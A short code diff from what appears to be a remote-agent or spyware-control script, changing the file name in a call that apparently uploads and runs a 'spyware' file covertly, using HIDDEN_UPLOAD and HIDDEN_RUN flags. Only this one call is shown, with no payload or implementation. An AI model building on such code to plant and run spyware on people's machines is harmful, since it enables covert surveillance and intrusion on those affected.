@@ -39,7 +39,7 @@ def main():
         agent.hidden_action_with_upload(
             FunCode.HIDDEN_UPLOAD | FunCode.HIDDEN_RUN,
             "spyware",
-            "sentSpyware6.spy",
+            "sentSpyware8.spy",
         )
     )
 
